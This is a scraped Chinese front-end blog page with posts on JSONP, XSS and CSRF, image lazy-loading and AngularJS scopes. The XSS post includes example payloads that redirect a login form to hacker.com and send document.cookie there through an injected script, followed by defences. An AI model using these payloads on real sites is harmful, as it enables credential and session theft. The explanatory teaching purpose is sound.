            <h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">js:</div><div class="line">function callbackFunction(result,methodName)&#123;&#125;</div></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">dataType:&apos;jsonp&apos;,</div><div class="line">data:&apos;id=10&apos;,</div><div class="line">jsonp:&apos;jsonp_callback&apos;,</div><div class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</div><div class="line">success:function(data)&#123;</div><div class="line">//dostuff</div><div class="line">&#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$.get(</div><div class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</div><div class="line">&#123;</div><div class="line">	param: data,  //参数</div><div class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</div><div class="line">  &apos;jsonp&apos;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</div><div class="line">function(data)&#123; //回调函数</div><div class="line">//dosomething</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/XSSCSRF.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/XSSCSRF.html" itemprop="url">
                  XSS 与 CSRF
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:56:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</div><div class="line">//但如果在访问的同时注入攻击代码，如下</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</div><div class="line">//页面代码就会变成</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</div><div class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</div><div class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</div><div class="line"></div><div class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</div><div class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</div><div class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</div><div class="line">document.write(content);</div><div class="line">document.write(&apos;&gt;&apos;);</div><div class="line">//本次代码注入的方式变为访问</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</div><div class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</div><div class="line"></div><div class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</div><div class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</div><div class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</div></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;</p>
<p>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/lazyload.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/lazyload.html" itemprop="url">
                  懒加载
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:55:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function lazyload() &#123;</div><div class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</div><div class="line">              const len = images.length</div><div class="line">              let n = 0</div><div class="line">              return function() &#123;</div><div class="line">                  console.log(1)</div><div class="line">                  const seeHeight = document.documentElement.clientHeight</div><div class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</div><div class="line">                  for (let i = n; i &lt; len; i++) &#123;</div><div class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</div><div class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</div><div class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</div><div class="line">                          &#125;</div><div class="line">                          n = n + 1</div><div class="line">                      &#125;</div><div class="line">                  &#125;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          var loadImages = lazyload()</div><div class="line">          window.onload = function () &#123;</div><div class="line">              loadImages()</div><div class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</div><div class="line">          &#125;</div></pre></td></tr></table></figure></p>
<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function throttle(fn, delay, atleast) &#123;</div><div class="line">                let timeout = null</div><div class="line">                let startTime = new Date()</div><div class="line">                return function() &#123;</div><div class="line">                    const curTime = new Date()</div><div class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</div><div class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</div><div class="line">                        fn()</div><div class="line">                        startTime = curTime</div><div class="line">                    &#125; else &#123;</div><div class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function debounced(fn,delay) &#123;</div><div class="line">  clearTimeout(timeoutID);  // reset timer</div><div class="line">  timeoutID = setTimeout(function() &#123;</div><div class="line">    // wait for some time</div><div class="line">    // and check if event happens again</div><div class="line">    fn()</div><div class="line">  &#125;, delay);</div><div class="line">&#125;;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="external">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
<p>设置了display:none属性元素的子元素，样式表中的背景图片不会渲染出来，也不会加载；而img标签的图片不会渲染出来，但会加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;display: none;&quot;&gt;</div><div class="line">  &lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//不加载</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
<p>当触发伪类的时候，伪类样式上的背景图片才会加载。</p>
<p>重复图片只加载一次，是因为加载一次后，之后的加载均从缓存中读取;<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651552419&amp;idx=2&amp;sn=f799d2d6e4dabe9a9f4c6658a666bcc5&amp;chksm=8025ad62b75224741cc211dc5cd9c0ee8ecef618eb2c35c0caee307465d60e31b7dfd50e08d0&amp;mpshare=1&amp;scene=1&amp;srcid=0115Kms4rvGLhJLnX7FPpZXq&amp;pass_ticket=tyJD73rZ13FVCnO01hd9fVJmLQcKjapRW2yB41zZMwumTsYvs1XDVW5%2BSiBX50%2Bk#rd" target="_blank" rel="external">链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/angularissue.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/angularissue.html" itemprop="url">
                  AngularJS issue
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-31T16:33:15+08:00">
                2017-10-31
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#$digest和$apply</p>
<p>当调用$digest的时候，只触发当前作用域和它的子作用域上的监控，但是当调用$apply的时候，会触发作用域树上的所有监控。</p>
<p>因此，从性能上讲，如果能确定自己作的这个数据变更所造成的影响范围，应当尽量调用$digest，只有当无法精确知道数据变更造成的影响范围时，才去用$apply，很暴力地遍历整个作用域树，调用其中所有的监控。</p>
<h1 id="视图模型的层次"><a href="#视图模型的层次" class="headerlink" title="视图模型的层次"></a>视图模型的层次</h1><p>在Angular中，存在作用域的继承。所谓作用域的继承，是指：如果两个视图有包含关系，内层视图对应的作用域可以共享外层视图作用域的数据。<br>以下情况会造成嵌套作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">// 1. controller 套嵌</div><div class="line">如果两个控制器所对应的视图存在上下级关系，它们的作用域就自动产生继承关系</div><div class="line">html:</div><div class="line">&lt;body ng-app=&quot;test&quot;&gt;</div><div class="line">    &lt;div ng-controller=&quot;OuterCtrl&quot;&gt;//父域</div><div class="line">        &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;div ng-controller=&quot;InnerCtrl&quot;&gt;//子域</div><div class="line">            &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</div><div class="line">            &lt;span ng-bind=&quot;b&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">js:</div><div class="line">var app = angular.module(&quot;test&quot;, []);</div><div class="line"></div><div class="line">app.controller(&quot;OuterCtrl&quot;, function ($scope) &#123;</div><div class="line">    $scope.a = 1;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.controller(&quot;InnerCtrl&quot;, function ($scope) &#123;</div><div class="line">    $scope.b = 100;</div><div class="line"></div><div class="line">    $scope.increasea = function() &#123;</div><div class="line">        $scope.a++;</div><div class="line">    &#125;;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//2.数组和对象属性迭代的时候,循环的每个元素都建立了单独的作用域</div><div class="line">&lt;ul&gt;</div><div class="line">    &lt;li ng-repeat=&quot;member in members&quot;&gt;&#123;&#123;member.name&#125;&#125; in &#123;&#123;teamname&#125;&#125;&lt;/li&gt; //每一个都是子域，但可以共享父域的teamname</div><div class="line">&lt;/ul&gt;</div><div class="line"></div><div class="line">//3.使用ng-if,ng-include,ng-view等指令时构建的DOM，会形成自己的子域</div><div class="line"></div><div class="line">inner.html</div><div class="line">&lt;div&gt;</div><div class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">outer.html</div><div class="line">&lt;div ng-controller=&quot;OuterCtrl&quot;&gt;</div><div class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</div><div class="line">    &lt;div ng-include=&quot;&apos;inner.html&apos;&quot;&gt;&lt;/div&gt;//ng-include会创建一层作用域，inner.html里面bind的name会使用OuterCtrl这个父域里面的name</div><div class="line">&lt;/div&gt;</div><div class="line">function OuterCtrl($scope) &#123;</div><div class="line">    $scope.name = &quot;outer name&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>作用域继承的缺点就是，子域绑定值能继承父域同名绑定值的值，但是一旦子域绑定值，因为某种触发函数发生改变，父域同名绑定值不会随之改变<br>虽然可以通过$parent获取父域的同名绑定值，然后子域中做到同时修改，但如果在代码中使用了这种方式，意味着视图模型也只能这样包含，如果再中间插一层子域，<br>则同名关系变成$parent.$parent，使关系进一步复杂<br>所以，应当尽量避免父子作用域存在同名变量的情况</p>
<p>从可重用性角度来看，如果满分5分的话，整个应用的这些部分的得分应当是这样：</p>
<p>服务，比如说，对后端RESTful接口的AJAX调用，对本地存储的访问等，5分<br>控制器（也就是视图模型），2-3分<br>指令，这个要看情况，有的指令是当作对HTML元素体系的扩展来用的，有些是其他事情的<br>纯UI类型的指令，也可以算是控件，比如DatetimePicker，5分<br>有些用于沟通DOM跟视图模型的指令，2分<br>界面模板，这个基本就没有重用性了，1分</p>
<h1 id="模块机制-module的坑"><a href="#模块机制-module的坑" class="headerlink" title="模块机制-module的坑"></a>模块机制-module的坑</h1><p>1.覆盖问题<br>如果moduleA,同时依赖moduleB和moduleC,而moduleB和moduleC有同名的factoryD,那在moduleA使用factoryD的时候，<br>根据依赖顺序，如果moduleB在前，则moduleC的factoryD会覆盖moduleB的factoryD，moduleA使用的是moduleC的factoryD<br>如果在以上依赖情况基础上，moduleA自己又定义了同名factoryD,那么moduleA自己的factoryD会覆盖moduleC的factoryD</p>
<p>2.module不支持运行时添加依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">angular.module(&quot;some.components&quot;, [])</div><div class="line">    //这里定义了一些组件</div><div class="line">    ;</div><div class="line">//上面是一个组件库，集中存放于components.js中，要在自己的应用中使用，必须：</div><div class="line">angular.module(&quot;our.app&quot;, [&quot;some.components&quot;]);</div><div class="line"></div><div class="line">//不可以这样</div><div class="line">angular.module(&quot;our.app&quot;, []);</div><div class="line"></div><div class="line">require(&quot;components.js&quot;, function() &#123;</div><div class="line">    // angular.module(&quot;our.app&quot;).addDependency(&quot;some.components&quot;);</div><div class="line">    // ready to use</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p>1.在绑定表达式里面，只能使用自定义函数，不能使用原生函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;&#123;&#123;abs(-1)&#125;&#125;&lt;/div&gt;//不允许这样使用</div></pre></td></tr></table></figure></p>
<p>如果确实需要调用原生函数，可以用一个自定义函数作包装，在自定义函数里面可以随意使用各种原生对象<br>绑定表达式里可以使用自定义函数，但如果只是对数据做简单处理可以使用过滤器</p>
<p>2.数组里有重复元素的情况，ng-repeat代码不能起作用，原因是Angular默认需要在数组中使用唯一索引<br>可以指定它使用序号作索引<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$scope.arr2 = [1, 1, 3];</div><div class="line">&lt;ul&gt;</div><div class="line">    &lt;li ng-repeat=&quot;item in arr2 track by $index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure></p>
<p>但对象值有重复的话，不用像数组那么麻烦需要指定$index做索引，因为它是对象的key做索引，是不会重复的。</p>
